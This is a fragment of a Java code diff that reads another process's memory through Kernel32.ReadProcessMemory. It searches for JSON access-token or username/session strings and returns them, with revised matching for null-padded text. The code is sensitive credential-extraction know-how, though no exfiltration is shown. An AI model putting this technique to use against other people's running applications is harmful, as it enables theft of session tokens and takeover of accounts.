@@ -113,14 +113,20 @@ public class Main {
                                 String bufferString = new String(buffer.toByteArray(), StandardCharsets.US_ASCII);
 
                                 boolean runOld;
-                                int offset;
                                 int endIdx;
-                                if ((offset = bufferString.indexOf("{\"access")) > -1) {
-                                    runOld = true;
-                                    endIdx = bufferString.substring(offset).indexOf("}");
-                                } else if ((offset = bufferString.indexOf("{\"username\"")) > -1 && !bufferString.contains(":{\"username\"") && !bufferString.contains("\"password\"")) {
+                                int offset = bufferString.indexOf("{\"");
+
+                                if (offset == -1 && (offset = bufferString.indexOf("{\0\"")) == -1) {
+                                    continue;
+                                }
+                                String withoutNull = bufferString.substring(offset).replace("\0", "");
+
+                                if (withoutNull.contains("{\"usern") && !withoutNull.contains(":{\"u") && !withoutNull.contains("\"password\"") && !withoutNull.contains("\"head\"")) {
                                     runOld = false;
                                     endIdx = bufferString.substring(offset).indexOf(",\"s");
+                                } else if ((offset = bufferString.indexOf("{\"acc")) > -1) {
+                                    runOld = true;
+                                    endIdx = bufferString.substring(offset).indexOf("}");
                                 } else {
                                     continue;
                                 }
@@ -130,7 +136,6 @@ public class Main {
                                     return bufferString + (runOld ? "}}" : "}");
                                 }
 
-                                buffer = segmentAllocator.allocateArray(CLinker.C_CHAR, CHUNK_SIZE*2);
                                 if (Kernel32.ReadProcessMemory(handle, readPointer.addOffset(offset), buffer, CHUNK_SIZE, MemoryAddress.NULL) != 0) {
                                     bufferString = makeReadable(buffer.toByteArray());
                                     endIdx = runOld ? bufferString.indexOf("}") : bufferString.indexOf(",\"s");
